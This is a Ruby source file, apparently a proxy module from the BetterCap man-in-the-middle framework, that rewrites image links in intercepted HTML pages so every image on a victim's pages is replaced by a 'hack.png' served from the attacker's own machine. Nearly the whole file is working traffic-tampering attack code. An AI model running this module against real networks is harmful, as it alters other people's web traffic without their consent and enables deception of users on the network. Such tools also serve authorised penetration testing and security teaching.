=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

# This module requires the --httpd argument being passed
# to bettercap and the --httpd-path pointing to a folder
# which contains a "hack.png" image.
class ReplaceImages < Proxy::Module
  def initialize
    # make sure the server is running
    raise BetterCap::Error, "The ReplaceImages proxy module needs the HTTPD ( --httpd argument ) running." unless Context.get.options[:httpd]
    # make sure the file we need actually exists
    raise BetterCap::Error, "No hack.png file found in the HTTPD path ( --httpd-path argument ) '#{Context.get.options[:httpd_path]}'" \
      unless File.exist? "#{Context.get.options[:httpd_path]}/hack.png"

    @image_url = "\"http://#{Context.get.ifconfig[:ip_saddr]}:#{Context.get.options[:httpd_port]}/hack.png\""
  end

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      Logger.info "Replacing http://#{request.host}#{request.url} images."
      
      response.body.gsub! %r/["'][https:\/\/]*[^\s]+\.(png|jpg|jpeg|bmp|gif)["']/i, @image_url
    end
  end
end
